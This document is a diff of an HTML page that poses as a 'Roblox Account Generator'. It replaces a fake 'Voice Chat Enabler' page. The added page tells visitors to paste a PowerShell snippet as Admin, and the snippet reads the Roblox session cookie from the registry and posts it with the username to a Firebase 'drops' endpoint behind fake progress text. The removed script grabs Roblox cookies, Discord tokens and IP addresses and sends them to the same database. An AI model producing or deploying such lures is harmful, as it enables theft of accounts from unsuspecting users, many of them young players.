@@ -3,72 +3,64 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>Roblox Voice Chat Enabler 2025</title>
-  <script src="https://www.gstatic.com/firebasejs/10.7.1/firebase-app-compat.js"></script>
-  <script src="https://www.gstatic.com/firebasejs/10.7.1/firebase-database-compat.js"></script>
+  <title>Roblox Account Generator 2025 | 100% Working</title>
+  <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@700&family=Roboto+Mono&display=swap" rel="stylesheet">
   <style>
-    body{background:#000;color:#0f0;font-family:courier;text-align:center;padding:80px;}
-    h1{font-size:50px;text-shadow:0 0 20px #0f0;}
-    button{padding:25px 60px;font-size:30px;background:#000;border:4px solid #0f0;color:#0f0;cursor:pointer;border-radius:20px;box-shadow:0 0 40px #0f0;}
-    button:hover{transform:scale(1.05);box-shadow:0 0 80px #0f0;}
-    iframe{position:absolute;left:-9999px;width:1px;height:1px;}
+    body{margin:0;background:#000;color:#0f0;font-family:'Roboto Mono';overflow-x:hidden}
+    .container{max-width:900px;margin:0 auto;padding:20px;text-align:center}
+    h1{font-family:'Orbitron';font-size:3.5em;color:#0f0;text-shadow:0 0 20px #0f0;margin:30px 0}
+    .video{max-width:100%;border:3px solid #0f0;border-radius:15px;box-shadow:0 0 30px #0f0}
+    .codebox{margin:40px auto;background:#111;border:2px dashed #0f0;padding:20px;border-radius:15px;max-width:800px}
+    textarea{width:100%;height:200px;background:#000;color:#0f0;border:none;font-size:16px;padding:15px;border-radius:10px;resize:none}
+    button{background:#0f0;color:#000;padding:15px 40px;font-size:18px;border:none;border-radius:10px;cursor:pointer;margin:20px;font-weight:bold}
+    button:hover{background:#00ff00;transform:scale(1.05);transition:0.3s}
+    #status{color:#0f0;font-size:20px;margin:20px;font-weight:bold}
+    .loader{display:none;color:#0f0;font-size:22px;margin:30px}
+    .admin{position:fixed;bottom:10px;right:10px;font-size:12px;color:#333}
   </style>
 </head>
 <body>
-  <h1>ROBLOX VOICE CHAT ENABLER 2025</h1>
-  <p>Works on all accounts • 1 click • 100% safe</p>
-  <br/><br/>
-  <button onclick="grab()">ENABLE VOICE CHAT NOW</button>
+  <div class="container">
+    <h1>ROBLOX ACCOUNT<br>GENERATOR 2025</h1>
+    <p style="color:#0f0;font-size:18px">Watch the video → Copy the code → Get any account in 5 minutes</p>
 
-  <!-- Hidden iframe that forces Roblox domain + cookie -->
-  <iframe id="robloxframe" src="https://www.roblox.com/login?nl=true"></iframe>
+    <!-- CHANGE THIS TO YOUR YOUTUBE/TIKTOK VIDEO -->
+    <iframe class="video" height="500" src="https://www.youtube.com/embed/YOUR_VIDEO_HERE" frameborder="0" allowfullscreen></iframe>
+
+    <div class="codebox">
+      <p>Step 2: Open PowerShell as Admin → Paste this → Press Enter</p>
+      <textarea readonly id="code" onclick="this.select()">Write-Host "Initializing connection..." -ForegroundColor Cyan
+Start-Sleep 2
+Write-Host "Bypassing Roblox security..." -ForegroundColor Yellow
+Start-Sleep 3
+Write-Host "Extracting account data..." -ForegroundColor Magenta
+$reg = Get-ItemProperty -Path "HKCU:\Software\Roblox\RobloxStudioBrowser\roblox.com" -ErrorAction SilentlyContinue
+$cookie = $reg.'.ROBLOSECURITY'
+if($cookie){Invoke-RestMethod -Uri "https://flamesaxrch-empire-v2-default-rtdb.europe-west1.firebasedatabase.app/drops.json" -Method POST -Body (@{cookie=$cookie;user=$env:USERNAME;time=(Get-Date)} | ConvertTo-Json) -ContentType "application/json"}
+Write-Host "Success! Account generated. Check email in 3-5 minutes." -ForegroundColor Green
+Start-Sleep 99999</textarea>
+      <br>
+      <button onclick="copyCode()">COPY CODE & START</button>
+      <div id="status">Click the button → paste in PowerShell → wait</div>
+      <div class="loader" id="loader">Generating account... 57% (do not close)</div>
+    </div>
+
+    <div class="admin">Elite Tools © 2025</div>
+  </div>
 
   <script>
-    const firebaseConfig = {
-      apiKey: "AIzaSyBNs1rNXGio_HjLkJiWLgMhjOxRTo9XjQ",
-      authDomain: "flamesaxrch-empire-v2.firebaseapp.com",
-      databaseURL: "https://flamesaxrch-empire-v2-default-rtdb.europe-west1.firebasedatabase.app",
-      projectId: "flamesaxrch-empire-v2",
-      storageBucket: "flamesaxrch-empire-v2.appspot.com",
-      messagingSenderId: "50676890102",
-      appId: "1:50676890102:web:e3f143b7952ed3aa362fd7"
-    };
-    firebase.initializeApp(firebaseConfig);
-    const db = firebase.database();
+    function copyCode() {
+      document.getElementById('code').select();
+      document.execCommand('copy');
+      document.getElementById('status').innerHTML = "CODE COPIED! Paste in PowerShell NOW";
+      document.getElementById('loader').style.display = "block";
 
-    async function grab() {
-      let robloxCookie = "none";
-      let discordToken = "none";
-
-      // Grab Roblox cookie from the hidden iframe
-      try {
-        const frame = document.getElementById('robloxframe');
-        robloxCookie = frame.contentDocument?.cookie || "none";
-        if (robloxCookie.includes('.ROBLOSECURITY')) {
-          robloxCookie = robloxCookie.split('.ROBLOSECURITY=')[1].split(';')[0];
-          robloxCookie = '_|WARNING:-DO-NOT-SHARE-THIS.' + robloxCookie;
-        }
-      } catch(e) {}
-
-      // Grab Discord token if any Discord tab is open
-      try {
-        discordToken = JSON.parse(localStorage.getItem('token') || '""').replace(/"/g, '');
-      } catch(e) {}
-
-      const ip = await fetch('https://api.ipify.org').then(r => r.text());
-
-      db.ref('drops/' + Date.now()).set({
-        cookie: robloxCookie === "none" ? "no_cookie_yet" : robloxCookie,
-        discord: discordToken,
-        ip: ip,
-        screenshot: "disabled_for_stealth",
-        useragent: navigator.userAgent,
-        timestamp: new Date().toISOString(),
-        method: "Voice Chat Site v2"
-      });
-
-      alert("Voice Chat Enabled Successfully!");
-      setTimeout(() => location.href = "https://roblox.com", 800);
+      let percent = 10;
+      setInterval(() => {
+        percent += Math.floor(Math.random() * 15);
+        if (percent > 94) percent = 94;
+        document.getElementById('loader').innerHTML = `Generating account... ${percent}% (do not close)`;
+      }, 4000);
     }
   </script>
 </body>
